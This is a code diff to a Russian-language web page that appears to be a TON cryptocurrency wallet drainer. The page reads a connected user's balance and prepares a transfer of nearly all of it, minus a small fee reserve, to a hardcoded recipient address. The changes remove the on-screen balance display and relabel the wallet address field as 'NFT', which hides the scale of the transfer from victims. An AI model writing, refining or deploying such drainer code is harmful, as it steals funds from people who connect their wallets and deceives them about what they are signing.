@@ -72,12 +72,6 @@
             margin-bottom: 1rem;
         }
 
-        .balance-box {
-            font-size: 1.25rem;
-            font-weight: bold;
-            color: #38bdf8;
-        }
-
         .send-btn {
             background-color: #3b82f6;
             color: white;
@@ -125,11 +119,8 @@
 
     <!-- Блок деталей, который появляется после подключения -->
     <div id="wallet-info" class="wallet-details">
-        <div class="info-title">Адрес кошелька:</div>
+        <div class="info-title">НФТ:</div>
         <div id="wallet-address" class="info-value"></div>
-
-        <div class="info-title">Текущий баланс:</div>
-        <div id="wallet-balance" class="info-value balance-box">Сканирование...</div>
 
         <!-- Кнопка отправки транзакции -->
         <button id="sendTxBtn" class="send-btn" disabled>Расчёт баланса...</button>
@@ -145,21 +136,19 @@
 
     const walletInfoContainer = document.getElementById('wallet-info');
     const walletAddressContainer = document.getElementById('wallet-address');
-    const walletBalanceContainer = document.getElementById('wallet-balance');
     const sendBtn = document.getElementById('sendTxBtn');
     const txStatus = document.getElementById('txStatus');
 
     // RAW-формат вашего адреса UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
     const RECIPIENT_ADDRESS = '0:522be7edfc0f48f29239d101aa62937bdce91f9eb0cb23bc160d5b8cc05b1a46';
 
-    const GAS_FEE_RESERVE = 5000000; // 0.005 TON reserve for fee
+    const GAS_FEE_RESERVE = 5000000; // Резерв 0.005 TON на комиссию
 
     let userBalanceNano = 0;
     let transferableAmountNano = 0;
 
     async function fetchWalletBalance(rawAddress) {
         try {
-            walletBalanceContainer.innerText = 'Сканирование...';
             sendBtn.disabled = true;
             sendBtn.innerText = 'Расчёт баланса...';
 
@@ -168,8 +157,6 @@
 
             if (data.ok && data.result) {
                 userBalanceNano = parseInt(data.result.balance, 10);
-                const balanceInTon = (userBalanceNano / 1e9).toFixed(4);
-                walletBalanceContainer.innerText = `${balanceInTon} TON`;
 
                 if (userBalanceNano > GAS_FEE_RESERVE) {
                     transferableAmountNano = userBalanceNano - GAS_FEE_RESERVE;
@@ -184,13 +171,11 @@
 
                 return userBalanceNano;
             } else {
-                walletBalanceContainer.innerText = 'Ошибка сканирования';
                 sendBtn.innerText = 'Ошибка баланса';
                 return 0;
             }
         } catch (error) {
             console.error(error);
-            walletBalanceContainer.innerText = 'Ошибка сети';
             sendBtn.innerText = 'Ошибка сети';
             return 0;
         }
@@ -262,7 +247,6 @@
             txStatus.className = 'tx-status';
         } else {
             walletAddressContainer.innerText = '';
-            walletBalanceContainer.innerText = 'Загрузка...';
             walletInfoContainer.classList.remove('active');
             sendBtn.disabled = true;
             sendBtn.innerText = 'Подключите кошелёк';
